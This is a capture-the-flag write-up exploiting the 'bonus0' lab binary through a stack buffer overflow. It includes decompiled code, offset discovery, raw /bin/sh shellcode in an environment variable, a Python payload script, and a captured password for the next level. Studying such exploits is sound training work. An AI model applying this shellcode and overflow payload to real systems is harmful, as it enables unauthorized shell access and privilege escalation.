# bonus0

The `bonus0` binary reads our input twice, prints some ` - ` and prints our concatenated input (with a space between)

```sh
$ ./bonus0
 - 
a
 - 
a
a a
```

It seems like we can corrupt the output by writing a lot of characters into it.

```sh
$ ./bonus0
 - 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 - 
ljkghdfjklghdfjskghdkfjsghdkjfh
AAAAAAAAAAAAAAAAAAAAljkghdfjklghdfjskghd�����K��h����6��� ljkghdfjklghdfjskghd�����K��h����6���
Segmentation fault (core dumped)
```

Using `ltrace` we can see these calls :

```c
read(..., ..., 4096);   // A read of 4096 bytes
strchr("...", '\n');    // Looking for a \n in our first input
strncpy(..., ..., 20);  // Copying the first 20 characters of our input into a buffer
puts(" - ");            // A random call to puts
read(..., "...", 4096); // The second read, again with a buffer of 4096 bytes
strchr("...", '\n');    // Looking for a \n in our second input
strncpy(..., ..., 20);  // Another copy of the first 20 characters of our input into a buffer
strcpy(..., ..., ...);  // A full copy of something into a buffer
strcat(..., ...);       // A concatenation of the two buffers
puts("");               // A final call to puts to print the resulting buffer
```

Looking at the decomp using `ghidra`, there's a main function calling `pp` and `puts`, along with the declaration of a buffer of size `54`.

```c
int main(void)
{
    char buff[54];
    pp(buff);
    puts(buff);
    return 0;
}
```

The `pp` function, that we can prettify using `ltrace`'s output :

```c
void pp(char *buff) {
    char s1[20];
    char s2[20];
    p(s1, " - ");
    p(s2, " - ");
    strcpy(buff,s1);
    buff[strlen(buff)] = ' ';
    strcat(buff,s2);
    return;
}
```

The `p` function :

```c
void p(char *s1, char *s2)
{
    char buff[4104];
    puts(s2);
    read(0, buff, 4096);
    *(strchr(buff, '\n')) = '\0';
    strncpy(s1, buff, 20);
}
```

Thanks to `ltrace` and our decompilation, we can exploit the binary without having to debug it.

We need to find the overflow offset to overwrite the return address of the `p` function.
```sh
$ gdb ./bonus0
r
 - 
# Input 20 chars to fill the first buffer, overwriting the NULL byte
AAAAAAAAAAAAAAAAAAAA
 - 
AAAAAAAAAAAAAAAAAAAAaaaabaaacaaadaaaeaaa��- aaaabaaacaaadaaaeaaa��-
<pattern>
Program received signal SIGSEGV, Segmentation fault.
0x61646161 in ?? ()
```

0x61646161 = adaa, our pattern is `aaaabaaacaaadaaaeaaa`
So our offset is at 9.

To build our payload, we will use [this shellcode](https://shell-storm.org/shellcode/files/shellcode-841.html) that will execute `/bin/sh`.

```sh
export SHELLCODE=$(python -c 'print "\x90"*256')$(echo -en "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")
```

To inject our shellcode into the binary, we will use an environment variable, and use another C program to print its address.

```c
int main(int argc, char **argv, char **envp) {
    printf("payload @ %p\n", getenv("PAYLOAD"));
}
```

```sh
cat << EOF > /tmp/getaddr.c
int main(int argc, char **argv, char **envp) {
    printf("shellcode @ %p\n", getenv("SHELLCODE"));
}
EOF
gcc -o /tmp/getaddr /tmp/getaddr.c
/tmp/getaddr
shellcode @ 0xbffff807
```

Here, in our payload, we're adding 256 NOPs to the shellcode so we are allowed a small margin of error in the address we provide, this technique is called a (NOP sled)[https://en.wikipedia.org/wiki/NOP_slide].

Our payload will be composed of :

- 4095 chars
- 14 padding chars to fill the start of the second buffer
- The shellcode address (0xbfffffa5)
- A padding character

```py
import struct

print "A" * 4095

payload = "B" * (19 - 4 - 1)
payload += struct.pack("I", 0xbffff807)
payload += "C"
print payload
```

```sh
$ python /tmp/payload.py > /tmp/payload
```

```sh
$ cat /tmp/payload - | ./bonus0
id
uid=2010(bonus0) gid=2010(bonus0) euid=2011(bonus1) egid=100(users) groups=2011(bonus1),100(users),2010(bonus0)
cat /home/user/bonus1/.pass    
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```